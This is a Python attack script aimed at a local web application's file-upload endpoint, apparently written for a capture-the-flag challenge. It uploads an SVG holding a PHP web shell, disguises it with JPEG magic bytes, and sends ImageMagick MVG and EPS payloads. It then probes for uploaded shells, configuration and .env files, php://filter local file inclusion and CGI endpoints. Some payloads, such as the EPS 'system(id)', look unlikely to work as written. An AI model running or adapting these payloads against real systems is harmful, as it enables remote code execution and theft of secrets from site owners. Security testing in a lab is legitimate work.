import requests
import base64

base_url = "http://127.0.0.1:33021"

# Test 1: SVG file with embedded PHP/XML injection
print("[*] TEST 1: Upload SVG with embedded script")
svg_content = b'''<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <rect width="100" height="100" fill="red"/>
  <script type="text/php">system($_GET['cmd']);</script>
</svg>'''
files = {'userfile': ('test.svg', svg_content, 'image/svg+xml')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Status: {response.status_code}")
print(f"[+] Response: {response.text[:500]}")

# Check if SVG uploaded
svg_check = requests.get(f"{base_url}/upload/test.svg")
print(f"[+] SVG check: {svg_check.status_code}")

# Test 2: SVG with PHP extension
print("\n[*] TEST 2: SVG with .jpg extension")
svg_jpeg = b'\xff\xd8\xff\xe0\x00\x10JFIF' + svg_content
files = {'userfile': ('svg.jpg', svg_jpeg, 'image/jpeg')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Status: {response.status_code}")

# Test 3: ImageMagick exploit - MVG format
print("\n[*] TEST 3: ImageMagick MVG exploit")
mvg_content = b'''push graphic-context
viewbox 0 0 640 480
image copy 0,0,0,0 'label:%x"
'''
files = {'userfile': ('test.mvg', mvg_content, 'image/mvg')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Status: {response.status_code}")
print(f"[+] Response: {response.text[:500]}")

# Test 4: ImageMagick exploit - eps format
print("\n[*] TEST 4: EPS file with shell")
eps_content = b'''%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: 0 0 100 100
system(id)
showpage
%%EOF'''
files = {'userfile': ('test.eps', eps_content, 'application/postscript')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Status: {response.status_code}")

# Test 5: Check all uploaded files
print("\n[*] TEST 5: List all files in upload directory")
files_to_check = ['test.jpg', 'shell.jpg', 'exec.jpg', 'comment.jpg', 'test.svg', 'test.mvg', 'test.eps', 'flag.jpg', 'info.jpg']
for f in files_to_check:
    r = requests.get(f"{base_url}/upload/{f}")
    if r.status_code == 200:
        print(f"[+] {f}: {r.status_code} ({len(r.content)} bytes)")
        # Check if PHP executed
        if 'uid=' in r.text or 'FLAG' in r.text:
            print(f"[!] PHP EXECUTION DETECTED in {f}!")
            print(r.text)

# Test 6: Try alternate upload endpoint
print("\n[*] TEST 6: Check for alternate endpoints")
endpoints = ['/upload.php', '/process.php', '/image.php', '/view.php', '/show.php', '/api/upload']
for ep in endpoints:
    r = requests.get(f"{base_url}{ep}")
    print(f"[+] {ep}: {r.status_code}")

# Test 7: Check for config files
print("\n[*] TEST 7: Check for configuration files")
configs = ['/config.php', '/configuration.php', '/settings.php', '/wp-config.php', '/.env']
for cfg in configs:
    r = requests.get(f"{base_url}{cfg}")
    if r.status_code != 404:
        print(f"[+] {cfg}: {r.status_code} - {r.text[:200]}")

# Test 8: Try to read PHP source via various methods
print("\n[*] TEST 8: Try to read PHP source")
# Using php://filter wrapper
r = requests.get(f"{base_url}/index.php", params={'file': 'php://filter/convert.base64-encode/resource=index.php'})
if 'PD9' in r.text:  # Base64 of <?php
    print("[!] LFI with php://filter!")
    # Decode
    import base64
    decoded = base64.b64decode(r.text.split('PD9')[0][:100] + 'PD9' + r.text.split('PD9')[1][:100] if 'PD9' in r.text else r.text)
    print(f"[+] Decoded: {decoded}")

# Test 9: Check for robots.txt and sitemap
print("\n[*] TEST 9: Check robots.txt")
r = requests.get(f"{base_url}/robots.txt")
print(f"[+] robots.txt: {r.status_code}")
if r.status_code == 200:
    print(f"[+] Content: {r.text}")

# Test 10: Check response headers for clues
print("\n[*] TEST 10: Analyze response headers")
r = requests.get(f"{base_url}/")
print(f"[+] Headers: {dict(r.headers)}")

# Check Server header
print(f"[+] Server: {r.headers.get('Server', 'Unknown')}")
print(f"[+] X-Powered-By: {r.headers.get('X-Powered-By', 'Unknown')}")

# Test 11: Try to access environment via CGI
print("\n[*] TEST 11: Try CGI access")
r = requests.get(f"{base_url}/cgi-bin/printenv")
print(f"[+] CGI printenv: {r.status_code}")

r = requests.get(f"{base_url}/cgi-bin/test.cgi")
print(f"[+] CGI test: {r.status_code}")

